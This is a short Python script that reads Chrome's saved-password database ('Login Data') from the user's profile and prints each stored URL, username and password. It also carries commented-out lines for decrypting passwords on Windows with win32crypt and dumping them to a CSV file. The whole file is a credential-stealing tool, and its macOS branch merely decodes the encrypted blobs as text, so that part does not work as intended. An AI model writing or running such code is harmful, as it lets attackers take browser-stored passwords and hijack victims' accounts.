# imports 
import os 
import sqlite3
import shutil
import csv
# windows os 
# import win32crypt



def get_chrome():
    # windows os 
    # data_path = os.path.expanduser("~") + r"/AppData/Local/Google/Chrome/User Data/Default/Login Data"

    data_path = os.path.expanduser("~") + r"/Library/Application Support/Google/Chrome/Default/Login Data"
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = "SELECT origin_url, username_value , password_value FROM logins"
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    cred = {}
    string = ""
    print(login_data)
    for url , user_name , pwd in login_data:
        print(pwd)
        print(pwd[1])
        # windoes os
        # pwd = win32crypt.CryptUnprotectData(pwd)
        # cred[url] = (user_name, pwd[1].decode("utf-8"))

        cred[url] = (user_name, pwd.decode("latin-1"))
        string += "\n[+] URL:%s \n USERNAME:%s \n PASSWORD:%s\n" % (url, user_name, pwd.decode("latin-1"))
        print(string)

        # with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        #     csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        #     csv_writer.writerow(["index","url","username","password"])
        #     csv_writer.writerow([index,url,username,decrypted_password])


if __name__ == "__main__":
    get_chrome()